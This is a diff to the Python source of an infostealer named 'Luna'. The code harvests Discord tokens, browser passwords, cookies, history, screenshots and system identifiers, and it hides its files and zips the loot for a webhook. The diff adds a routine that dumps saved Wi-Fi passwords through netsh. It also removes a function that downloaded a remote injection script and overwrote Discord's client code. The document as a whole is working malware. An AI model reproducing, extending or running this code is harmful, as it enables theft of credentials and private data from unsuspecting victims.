@@ -40,7 +40,7 @@ def main(webhook):
     get_inf()
     grabtokens()
 
-    threads = [ss, grabpassword, cookies, history]
+    threads = [ss, grabpassword, grabcookies, grabhistory, grabwifi]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -73,9 +73,15 @@ def main(webhook):
 def Luna():
     debug()
     main(webhook)
-    inject(webhook)
     cleanup()
 
+def try_extract(func):
+        def wrapper(*args, **kwargs):
+            try:
+                func(*args, **kwargs)
+            except Exception:
+                pass
+        return wrapper
 
 def get_inf():
     ip_address = requests.get('http://ipinfo.io/json').json()['ip']
@@ -97,6 +103,7 @@ def get_inf():
     embed.add_field(name="SYSTEM INFO", value=f'''```yaml
 PC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\n\nIP: {ip_address}\nMAC: {mac_address}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB```''', inline=False)
 
+@try_extract
 class grabtokens():
     def __init__(self):
 
@@ -271,7 +278,7 @@ def ss():
     ).save("screenshot.png")
     hide("screenshot.png")
 
-
+@try_extract
 class grabpassword():
     def __init__(self):
         self.appdata = os.getenv("localappdata")
@@ -357,7 +364,8 @@ class grabpassword():
             f.write("\n\nUsed Login Dbs:\n")
             f.write("\n".join(used_login_dbs))
 
-class history():
+@try_extract
+class grabhistory():
     def __init__(self):
         if "chrome.exe" in (p.name() for p in psutil.process_iter()):
             os.system("taskkill /im chrome.exe /f")
@@ -390,8 +398,44 @@ class history():
         with open(".\\google-history.txt", "a") as f:
             f.write("\nAll Google Search History:\n")
             f.write("\n".join(history))
-        
-class cookies():
+
+@try_extract
+class grabwifi:
+    def __init__(self):
+        self.wifi_list = []
+        self.name_pass = {}
+
+        with open(".\\wifi-passwords.txt", "w", encoding="cp437", errors='ignore') as f:
+            f.write("https://github.com/Smug246 | Wifi Networks & Passwords\n\n")
+        hide(".\\wifi-passwords.txt")
+  
+        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
+        for line in data:
+            if 'All User Profile' in line:
+                self.wifi_list.append(line.split(":")[-1][1:])
+            else:
+                with open(".\\wifi-passwords.txt", "a") as f:
+                    f.write(f'There is no wireless interface on the system. Ethernet using twats.')
+                f.close()
+
+        for i in self.wifi_list:
+            command = subprocess.getoutput(f'netsh wlan show profile "{i}" key=clear')
+            if "Key Content" in command:
+                split_key = command.split('Key Content')
+                tmp = split_key[1].split('\n')[0]
+                key = tmp.split(': ')[1]
+                self.name_pass[i] = key
+            else:
+                key = ""
+                self.name_pass[i] = key
+
+        with open(".\\wifi-passwords.txt", "a") as f:
+                for i, j in self.name_pass.items():
+                    f.write(f'Wifi Name : {i} | Password : {j}\n')
+        f.close()
+
+@try_extract
+class grabcookies():
     def __init__(self):
         self.appdata = os.getenv("localappdata")
 
@@ -469,6 +513,7 @@ def zipup():
         zipf.write("google-passwords.txt")
         zipf.write("google-cookies.txt")
         zipf.write("google-history.txt")
+        zipf.write("wifi-passwords.txt")
         zipf.write("screenshot.png")
 
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
@@ -478,6 +523,7 @@ def cleanup():
     for clean in [os.remove("google-passwords.txt"),
                   os.remove("google-cookies.txt"),
                   os.remove("google-history.txt"),
+                  os.remove("wifi-passwords.txt"),
                   os.remove("screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
 
@@ -490,18 +536,6 @@ def cleanup():
 def hide(file):
     SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)
 
-def inject(webhook_url):
-    appdata = os.getenv("localappdata")
-    for _dir in os.listdir(appdata):
-        if 'discord' in _dir.lower():
-            for __dir in os.listdir(os.path.abspath(appdata+os.sep+_dir)):
-                if match(r'app-(\d*\.\d*)*', __dir):
-                    abspath = os.path.abspath(appdata+os.sep+_dir+os.sep+__dir) 
-                    f = requests.get("https://raw.githubusercontent.com/Smug246/Luna-Grabber-Builder/main/injection.js").text.replace("%WEBHOOK%", webhook_url)
-                    modules_dir = os.listdir(abspath+'\\modules') 
-                    with open(abspath+f'\\modules\\{difflib.get_close_matches("discord_desktop_core", modules_dir, n=1, cutoff=0.6)[0]}\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
-                        indexFile.write(f)
-                    subprocess.call(["start", abspath+os.sep+"Discord.exe"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 class debug:
     def __init__(self):
